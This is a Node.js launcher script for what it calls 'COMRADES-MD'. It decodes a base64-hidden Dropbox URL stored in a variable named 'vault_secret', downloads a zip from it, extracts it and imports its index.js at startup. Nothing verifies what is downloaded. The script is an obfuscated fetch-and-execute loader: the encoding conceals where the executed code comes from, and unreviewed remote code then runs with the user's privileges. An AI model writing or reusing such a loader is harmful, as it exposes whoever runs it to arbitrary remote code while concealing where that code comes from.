import https from 'https';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import AdmZip from 'adm-zip';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);


const vault_secret = "aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL2JvZzB2aTBycGthOWU5YmFtNm45My92aHViX2NvcmUuemlwP3Jsa2V5PXRlNDYzYTNhZWc1bWpmc3RqYWt5aG1vNmImc3Q9ZXFlODJiczAmZGw9MQ==";

const download = (url, dest) => {
    return new Promise((resolve, reject) => {
        try {
            https.get(new URL(url), (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    return download(res.headers.location, dest).then(resolve).catch(reject);
                }
                if (res.statusCode !== 200) return reject(new Error(`Status ${res.statusCode}`));
                const file = fs.createWriteStream(dest);
                res.pipe(file);
                file.on('finish', () => { file.close(); resolve(); });
            }).on('error', reject);
        } catch (e) { reject(e); }
    });
};

(async () => {
    console.log('[V-HUB] SYSTEM STARTING...');
    try {
        const fullUrl = Buffer.from(vault_secret, 'base64').toString('utf-8');
        const zipPath = path.join(process.cwd(), 'core.zip');
        const extractPath = path.join(process.cwd(), 'hub_temp');

        if (!fs.existsSync(extractPath)) fs.mkdirSync(extractPath, { recursive: true });

        console.log('[V-HUB] FETCHING CORE...');
        await download(fullUrl, zipPath);
        
        console.log('[V-HUB] EXTRACTING...');
        const zip = new AdmZip(zipPath);
        zip.extractAllTo(extractPath, true);
        fs.unlinkSync(zipPath);
        
        let entryFile = path.join(extractPath, 'index.js');
        const nested = path.join(extractPath, 'COMRADES-MD-main', 'index.js');
        if (!fs.existsSync(entryFile) && fs.existsSync(nested)) entryFile = nested;

        console.log('[V-HUB] BOOTING COMRADES-MD...');
        process.chdir(path.dirname(entryFile));
        await import(`file://${entryFile}`);
    } catch (e) {
        console.error('[V-HUB] FATAL ERROR:', e.message);
        process.exit(1);
    }
})();
